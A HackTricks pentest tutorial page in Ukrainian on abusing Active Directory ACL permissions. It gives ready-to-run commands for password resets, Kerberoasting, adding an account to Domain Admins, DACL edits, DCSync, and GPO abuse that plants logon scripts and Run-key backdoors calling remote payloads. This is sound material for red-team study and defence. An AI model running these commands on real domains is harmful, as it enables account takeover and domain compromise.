# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для докладніших відомостей див. оригінальні статті.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Це право надає атакуючому повний контроль над цільовим обліковим записом користувача. Після того як права `GenericAll` підтверджено за допомогою команди `Get-ObjectAcl`, атакуючий може:

- **Change the Target's Password**: Використовуючи `net user <username> <password> /domain`, атакуючий може скинути пароль користувача.
- **Targeted Kerberoasting**: Призначте SPN для облікового запису користувача, щоб зробити його kerberoastable, а потім використайте Rubeus і targetedKerberoast.py для витягання та спроби злому хешів ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Вимкнути pre-authentication для користувача, роблячи їхній обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll — права над групою**

Ця привілегія дозволяє атакуючому маніпулювати членством у групі, якщо він має права `GenericAll` на групу, наприклад `Domain Admins`. Після визначення distinguished name (DN) групи за допомогою `Get-NetGroup`, атакуючий може:

- **Додати себе до групи Domain Admins**: Цього можна досягти за допомогою прямих команд або використовуючи модулі, такі як Active Directory або PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux ви також можете використовувати BloodyAD, щоб додати себе до довільних груп, якщо ви маєте над ними членство з правами GenericAll/Write. Якщо цільова група вкладена в “Remote Management Users”, ви відразу отримаєте доступ по WinRM на хостах, що враховують цю групу:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Володіння цими привілеями на об'єкті комп'ютера або обліковому записі користувача дозволяє:

- **Kerberos Resource-based Constrained Delegation**: Дозволяє захопити об'єкт комп'ютера.
- **Shadow Credentials**: Використовуйте цю техніку, щоб видавати себе за обліковий запис комп'ютера або користувача, експлуатуючи привілеї для створення Shadow Credentials.

## **WriteProperty on Group**

Якщо користувач має `WriteProperty` права на всі об'єкти для конкретної групи (наприклад, `Domain Admins`), він може:

- **Add Themselves to the Domain Admins Group**: Досягається поєднанням команд `net user` та `Add-NetGroupUser`; цей метод дозволяє ескалацію привілеїв у межах домену.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (самочленство у групі)**

Цей привілей дозволяє зловмисникам додавати себе до певних груп, таких як `Domain Admins`, через команди, які безпосередньо змінюють членство в групі. Використання наступної послідовності команд дозволяє додати себе:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (самододавання до груп)**

Схожа привілегія, вона дозволяє атакувальникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` на ці групи. Підтвердження та виконання цієї привілегії здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Маючи `ExtendedRight` на користувача для `User-Force-Change-Password`, можна скинути пароль без знання поточного пароля. Перевірка цього права та його експлуатація можуть виконуватись через PowerShell або альтернативні інструменти командного рядка, що надає кілька методів скидання пароля користувача, включно з інтерактивними сесіями та one-liners для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, що демонструє різноманітність векторів атаки.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner в групі**

Якщо зловмисник виявить, що має права `WriteOwner` над групою, він може змінити власника групи на себе. Це особливо критично, коли йдеться про `Domain Admins`, оскільки зміна власника дозволяє ширший контроль над атрибутами групи та її членством. Процес включає визначення потрібного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника — або за SID, або за ім'ям.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite на користувача**

Цей дозвіл дозволяє атакуючому змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, атакуючий може змінити шлях до скрипту входу користувача, щоб виконати шкідливий скрипт під час входу. Це досягається за допомогою команди `Set-ADObject` для оновлення властивості `scriptpath` цільового користувача, вказавши на скрипт атакуючого.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

З цим привілеєм зловмисники можуть маніпулювати членством у групі, наприклад додавати себе або інших користувачів до певних груп. Цей процес включає створення об'єкта облікових даних (credential object), використання його для додавання або видалення користувачів із групи та перевірку змін членства за допомогою команд PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Володіння об'єктом AD і наявність привілеїв `WriteDACL` на ньому дозволяє нападнику надати собі привілеї `GenericAll` щодо цього об'єкта. Це досягається шляхом маніпуляцій ADSI, що дає повний контроль над об'єктом і можливість змінювати його членство в групах. Водночас існують обмеження при спробі експлуатувати ці привілеї за допомогою модуля Active Directory та cmdlet'ів `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Реплікація в домені (DCSync)**

Атака DCSync використовує специфічні дозволи реплікації в домені, щоб імітувати Domain Controller та синхронізувати дані, включно з обліковими даними користувачів. Ця потужна техніка вимагає дозволів типу `DS-Replication-Get-Changes`, що дозволяє зловмисникам витягувати конфіденційну інформацію з AD-середовища без прямого доступу до контролера домену. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ для управління Group Policy Objects (GPOs) може створювати значні ризики безпеки. Наприклад, якщо користувачу `offense\spotless` делеговано права управління GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** та **WriteOwner**. Ці дозволи можуть бути зловживані в шкідливих цілях, як виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Перелічення дозволів GPO

Щоб виявити некоректно налаштовані GPO, можна зв'язати cmdlet-и PowerSploit. Це дозволяє знайти GPO, якими конкретний користувач має права керувати: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп'ютери, до яких застосовано певну політику**: Можна визначити, до яких комп'ютерів застосовується конкретний GPO, що допомагає зрозуміти масштаби потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп'ютера**: Щоб побачити, які політики застосовані до конкретного комп'ютера, можна використати `Get-DomainGPO`.

**OUs, до яких застосовано певну політику**: Визначення organizational units (OUs), які підпадають під дію певної політики, можна зробити за допомогою `Get-DomainOU`.

Ви також можете використати інструмент [**GPOHound**](https://github.com/cogiceo/GPOHound) для перелічення GPO і пошуку в них проблем.

### Зловживання GPO - New-GPOImmediateTask

Некоректно налаштовані GPO можуть бути використані для виконання коду, наприклад, створенням immediate scheduled task. Це може бути використано для додавання користувача до локальної групи administrators на уражених машинах, суттєво підвищуючи привілеї:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Зловживання GPO

Модуль GroupPolicy, якщо встановлений, дозволяє створювати та прив'язувати нові GPOs, а також встановлювати налаштування, такі як значення реєстру для виконання backdoors на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в систему для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse пропонує метод зловживання існуючими GPO шляхом додавання завдань або модифікації налаштувань без необхідності створювати нові GPO. Цей інструмент вимагає модифікації існуючих GPO або використання RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб прискорити цей процес, особливо після внесення змін, на цільовому комп'ютері можна виконати команду `gpupdate /force`, щоб примусово застосувати оновлення політик негайно. Ця команда гарантує, що будь-які зміни до GPO застосуються без очікування наступного автоматичного циклу оновлення.

### Під капотом

При перегляді Scheduled Tasks для певного GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання завдань, таких як `evilTask`. Такі завдання створюються через скрипти або інструменти командного рядка з метою змінити поведінку системи або підвищити привілеї.

Структура завдання, як показано в XML-файлі конфігурації, згенерованому `New-GPOImmediateTask`, описує деталі запланованого завдання — включаючи команду для виконання та її тригери. Цей файл відображає, як заплановані завдання визначаються та керуються в межах GPO, надаючи метод для виконання довільних команд або скриптів у рамках примусового застосування політик.

### Користувачі та групи

GPO також дозволяють маніпулювати членством користувачів та груп на цільових системах. Редагуючи файли політик Users and Groups безпосередньо, зловмисники можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо через делегування прав керування GPO, що дозволяє змінювати файли політик для додавання нових користувачів або зміни членства в групах.

XML-файл конфігурації для Users and Groups описує, як ці зміни реалізуються. Додаючи записи до цього файлу, певним користувачам можна надати підвищені привілеї на всіх уражених системах. Цей метод пропонує прямий підхід до ескалації привілеїв через маніпуляцію GPO.

Крім того, можна розглядати додаткові методи для виконання коду або підтримання персистенції, такі як використання скриптів logon/logoff, модифікація ключів реєстру для автозапуску, встановлення програмного забезпечення через .msi-файли або редагування конфігурацій сервісів. Ці техніки надають різні шляхи для збереження доступу та контролю над цільовими системами шляхом зловживання GPO.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
